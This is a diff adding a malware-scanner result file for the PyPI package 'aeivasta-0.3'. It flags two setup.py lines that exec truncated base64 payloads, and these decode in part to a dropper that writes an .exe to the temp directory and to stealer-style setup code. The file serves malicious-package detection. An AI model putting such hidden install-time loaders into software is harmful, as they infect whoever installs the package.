@@ -1,0 +1,29 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": {},
+        "dll-hijacking": {},
+        "exec-base64": [
+            {
+                "location": "setup.py:28",
+                "code": "        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ1dkZTI0YmM5ZmFlYmJhMTY0ZDhjODQ2N2E1Zjc4NDAuZXhlJykKaWYgbm90IG8ucGF0aC5leGlzdHMocCk6CiAgICB3aXRoIG9wZW4ocCwgJ3diJykgYXMgZjoKICAg...decode())\n",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            },
+            {
+                "location": "setup.py:30",
+                "code": "        exec(b64decode('Vz0ndXRmLTgnClY9J0dFVCcKVT0nbGludXgnClQ9cHJpbnQKRT1yYW5nZQpTPWZpbHRlcgpEPVRydWUKST1FeGNlcHRpb24KZnJvbSBnbG9iIGltcG9ydCBnbG9iIGFzIEYKZnJvbSBqc29uIGltcG9ydCBkdW1wCmZyb20gdGltZSBpbXBvcnQgdGltZQpmcm9tIGlvIGltcG9ydCBCeXRl....decode())",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            }
+        ],
+        "download-executable": {},
+        "cmd-overwrite": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/aeivasta-0.3"
+}
